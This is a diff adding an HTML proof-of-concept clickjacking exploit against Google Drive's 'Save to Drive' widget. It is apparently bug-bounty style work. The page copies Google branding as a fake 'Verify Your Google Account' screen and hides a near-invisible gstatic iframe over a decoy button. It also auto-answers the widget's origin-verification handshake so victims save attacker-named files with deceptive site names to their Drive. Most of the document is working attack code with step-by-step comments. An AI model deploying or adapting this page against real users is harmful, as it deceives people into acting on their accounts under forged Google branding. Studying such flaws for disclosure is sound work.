@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<!--
+  Drive Save Clickjacking v2 — via gstatic chain
+
+  WHY v1 FAILED:
+  Direct Drive widget embed → popup URL has empty requestOrigin + widgetId
+  → verifyOrigin handshake fails → Save button dead
+
+  WHY v2 WORKS:
+  Drive widget via gstatic chain (?parent=ATTACKER_ORIGIN) →
+  widget properly sets requestOrigin=ATTACKER_ORIGIN in saverauth URL →
+  our verifyOrigin matches → Save button works
+
+  ATTACK LAYOUT:
+  - gstatic frame: absolute, 220×50px, opacity:0.01 (near-invisible), z-index:10
+  - Decoy button: absolute, same position, visible, z-index:5
+  - Victim sees the decoy, clicks it, actually clicks gstatic → Drive button inside
+
+  FLOW:
+  1. Page loads → gstatic chain initializes → Drive widget loads inside gstatic
+  2. Victim clicks "Claim Your Reward" → click goes through to Drive button
+  3. Drive saverauth popup opens with requestOrigin=OUR_ORIGIN (properly set by chain)
+  4. Our page auto-responds to reqVerifyOrigin with verifyOrigin
+  5. Popup shows save dialog with attacker-controlled filename + sitename
+  6. Victim clicks "Save" in popup → file in Drive
+
+  WHAT VICTIM SEES IN POPUP:
+  "[SITENAME] souhaiterait enregistrer [FILENAME] sur votre Drive."
+  → Attacker controls both strings entirely
+
+  CHECK DRIVE after clicking Save for: FILENAME below
+-->
+<html>
+<head>
+<title>Verify Your Google Account</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Google Sans', Arial, sans-serif;
+    background: #f1f3f4;
+    display: flex; align-items: center; justify-content: center;
+    min-height: 100vh; padding: 20px;
+  }
+  .card {
+    background: white;
+    border-radius: 8px;
+    padding: 40px 32px;
+    width: 400px;
+    box-shadow: 0 1px 3px rgba(0,0,0,.2), 0 1px 8px rgba(0,0,0,.1);
+    text-align: center;
+  }
+  .glogo { font-size: 22px; letter-spacing: -1px; margin-bottom: 24px; }
+  .glogo span:nth-child(1) { color: #4285f4; }
+  .glogo span:nth-child(2) { color: #ea4335; }
+  .glogo span:nth-child(3) { color: #fbbc05; }
+  .glogo span:nth-child(4) { color: #4285f4; }
+  .glogo span:nth-child(5) { color: #34a853; }
+  .glogo span:nth-child(6) { color: #ea4335; }
+  h2 { font-size: 20px; color: #202124; margin-bottom: 8px; font-weight: 400; }
+  p { color: #5f6368; font-size: 14px; line-height: 1.6; margin-bottom: 28px; }
+
+  /* The container for the clickjack overlay */
+  .btn-area {
+    position: relative;
+    width: 100%;
+    height: 48px;
+    margin-bottom: 12px;
+  }
+
+  /* VISIBLE decoy button — what victim sees */
+  .decoy-btn {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 48px;
+    background: #1a73e8;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    z-index: 5;
+    pointer-events: none; /* let clicks pass through to iframe above */
+  }
+
+  /* INVISIBLE gstatic iframe — on top, captures clicks, passes to Drive button */
+  #gstatic_frame {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 48px;
+    border: none;
+    opacity: 0.01;          /* nearly invisible — set to 0.5 to debug alignment */
+    z-index: 10;
+    pointer-events: all;
+    cursor: pointer;
+  }
+
+  .footer { font-size: 11px; color: #80868b; margin-top: 16px; }
+
+  /* Debug log — hidden by default */
+  #log {
+    margin-top: 16px;
+    background: #f8f9fa;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    padding: 8px;
+    font-family: monospace;
+    font-size: 10px;
+    text-align: left;
+    max-height: 150px;
+    overflow: auto;
+    display: none;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="glogo">
+    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+  </div>
+
+  <h2>Action required for your account</h2>
+  <p>
+    To ensure your account security, please verify your identity
+    by acknowledging the latest Google Terms of Service update.
+  </p>
+
+  <div class="btn-area">
+    <!-- Visible decoy (pointer-events:none so clicks pass through) -->
+    <button class="decoy-btn">Accept & Continue</button>
+    <!--
+      Invisible gstatic iframe on top (z-index:10).
+      The Drive "Save to Drive" button inside fills this area.
+      Victim's click hits this iframe → hits Drive button → popup opens.
+
+      IMPORTANT: gstatic is loaded AFTER GAPI initializes below.
+      The src is set dynamically once the GAPI chain is ready.
+    -->
+    <iframe id="gstatic_frame" name="gstatic_frame"></iframe>
+  </div>
+
+  <div class="footer">
+    By continuing, you agree to Google's
+    <a href="#">Terms of Service</a> and
+    <a href="#">Privacy Policy</a>.
+  </div>
+
+  <pre id="log"></pre>
+  <button onclick="document.getElementById('log').style.display=document.getElementById('log').style.display==='block'?'none':'block'" style="font-size:9px;margin-top:6px;padding:1px 6px">debug log</button>
+</div>
+
+<script>
+var HASH = '05acf2f48052137958a41565358fb972';
+var JSH  = 'jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.ch0Jz-JlMrQ.O%2Fd%3D1%2Frs%3DAHpOoo_YD4KoV8fTh_kLhktsiThAm3yJ5A%2Fm%3D__features__';
+
+var L = document.getElementById('log');
+var T0 = Date.now();
+function say(m) {
+  var t = ((Date.now()-T0)/1000).toFixed(1);
+  L.textContent += '[T+' + t + 's] ' + m + '\n';
+  L.scrollTop = L.scrollHeight;
+}
+
+// ATTACKER PAYLOAD — these appear verbatim in Google's save dialog
+var ATTACKER_SRC      = 'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png';
+var ATTACKER_FILENAME = 'Google_Account_Recovery_2024.pdf';
+var ATTACKER_SITENAME = 'Google Account Security';
+
+// Drive widget URL — attacker controls all display params
+var DRIVE_URL = 'https://drive.google.com/savetodrivebutton' +
+  '?usegapi=1' +
+  '&src='      + encodeURIComponent(ATTACKER_SRC) +
+  '&filename=' + encodeURIComponent(ATTACKER_FILENAME) +
+  '&sitename=' + encodeURIComponent(ATTACKER_SITENAME);
+
+say('Payload: ' + ATTACKER_FILENAME + ' from "' + ATTACKER_SITENAME + '"');
+
+// AUTO-RESPOND to reqVerifyOrigin — enables the Save button in popup
+window.addEventListener('message', function(ev) {
+  var raw = ev.data;
+  if (!raw) return;
+  var str = typeof raw === 'string' ? raw : JSON.stringify(raw);
+
+  if (ev.origin === 'https://drive.google.com' || ev.origin === 'https://www.gstatic.com') {
+    say('MSG [' + ev.origin + ']: ' + str.slice(0, 200));
+  }
+
+  try {
+    var d = (typeof raw === 'object') ? raw : JSON.parse(raw);
+    if (d && d.saveToDrivePostMessageType === 'reqVerifyOrigin') {
+      say('>>> CLICK REGISTERED — reqVerifyOrigin received');
+      say('    widgetId: [' + d.widgetId + '] requestOrigin: [' + d.requestOrigin + ']');
+      say('>>> Auto-responding with verifyOrigin...');
+      var resp = {
+        saveToDrivePostMessageType: 'verifyOrigin',
+        requestorigin: d.requestOrigin || d.requestorigin || location.origin
+      };
+      try {
+        ev.source.postMessage(resp, ev.origin);
+        say('>>> verifyOrigin sent. Popup Save button now enabled.');
+        say('>>> Victim must click "Save" in the popup to complete.');
+        say('>>> FILE TO CHECK IN DRIVE: ' + ATTACKER_FILENAME);
+      } catch(e) {
+        ev.source.postMessage(JSON.stringify(resp), '*');
+      }
+    }
+    if (d && d.saveToDrivePostMessageType === 'saved') {
+      say('!!! SAVED CONFIRMED — file is in victim Drive!');
+      say('!!! FULL CHAIN COMPLETE: 1 decoy click + 1 Google popup click');
+    }
+    if (d && d.saveToDrivePostMessageType) {
+      say('Drive event: ' + d.saveToDrivePostMessageType);
+    }
+  } catch(e) {}
+}, false);
+
+// GAPI setup
+var s = document.createElement('script');
+s.src = 'https://apis.google.com/js/api.js';
+s.onload = function() {
+  gapi.load('gapi.rpc', function() {
+    say('gapi.rpc loaded. Initializing gstatic chain...');
+
+    gapi.rpc.register('gapiInitialized', function() {
+      say('gapiInitialized — gstatic chain ready');
+      say('Loading Drive widget inside gstatic...');
+      // Load Drive widget into gstatic's innerFrame
+      gapi.rpc.call('gstatic_frame', 'updateInnerFrame', null, DRIVE_URL, true, false);
+    });
+
+    gapi.rpc.register('innerFrameLoaded', function() {
+      say('innerFrameLoaded — Drive widget ready inside gstatic');
+      say('Clickjack armed: victim clicks "Accept & Continue" -> Drive button');
+      say('requestOrigin will be properly set to: ' + location.origin);
+    });
+
+    gapi.rpc.register('resize', function(h) {
+      say('Drive widget resize: ' + h + 'px');
+    });
+
+    // Load gstatic with our origin as trusted parent
+    // This is what sets requestOrigin properly in the saverauth URL
+    var frame = document.getElementById('gstatic_frame');
+    frame.src = 'https://www.gstatic.com/atari/embeds/' + HASH +
+      '/intermediate-frame-minified.html?' + JSH +
+      '&parent=' + encodeURIComponent(location.origin);
+    gapi.rpc.setup('gstatic_frame');
+    say('gstatic chain loading... (' + location.origin + ' as trusted parent)');
+    say('The Drive "Save to Drive" button renders inside the invisible overlay.');
+  });
+};
+document.head.appendChild(s);
+
+say('Page loaded. Victim sees "Accept & Continue".');
+say('Invisible gstatic overlay on top captures the click.');
+</script>
+</body>
+</html>
